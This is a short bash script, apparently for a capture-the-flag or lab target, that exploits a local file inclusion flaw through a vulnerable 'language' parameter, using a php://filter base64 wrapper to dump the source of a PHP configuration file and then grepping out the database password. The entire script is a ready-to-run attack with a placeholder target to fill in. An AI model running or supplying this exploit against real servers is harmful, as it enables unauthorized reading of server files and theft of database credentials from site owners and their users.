#!/bin/bash

# ---[ CONFIGURATION ]---
TARGET="http://XX.XXX.XX.XX:XXXXX"       # Change to your target
PARAM="language"                         # The vulnerable parameter
FILE="configure"                         # The target PHP file (no extension)
EXT="php"                                # Extension (optional)
OUTFILE="dumped_config.php"

echo "[*] Launching LFI php://filter attack on $TARGET"

# ---[ Step 1: Fetch base64-encoded source using LFI ]---
URL="${TARGET}/index.php?${PARAM}=php://filter/read=convert.base64-encode/resource=${FILE}"

echo "[*] Sending request to: $URL"
RESPONSE=$(curl -s "$URL")

# ---[ Step 2: Extract base64 content ]---
# Optional: Use grep/sed/awk here to isolate base64 if there's HTML junk.
# Assuming the server just outputs raw base64:
BASE64_CODE=$(echo "$RESPONSE" | tr -d '\n')

if [[ -z "$BASE64_CODE" ]]; then
  echo "[!] No base64 content found. Exiting."
  exit 1
fi

# ---[ Step 3: Decode and save to file ]---
echo "$BASE64_CODE" | base64 -d > "$OUTFILE"

if [[ $? -ne 0 ]]; then
  echo "[!] Failed to decode base64."
  exit 1
fi

echo "[+] Decoded PHP file saved to: $OUTFILE"
echo "------ START OF FILE ------"
cat "$OUTFILE"
echo "------- END OF FILE -------"

# ---[ Step 4: Grep password if present ]---
echo "[*] Extracting credentials (best effort)..."
grep -E "'DB_PASSWORD'\s*=>\s*'[^']+'" "$OUTFILE" || echo "[!] Could not extract DB password."
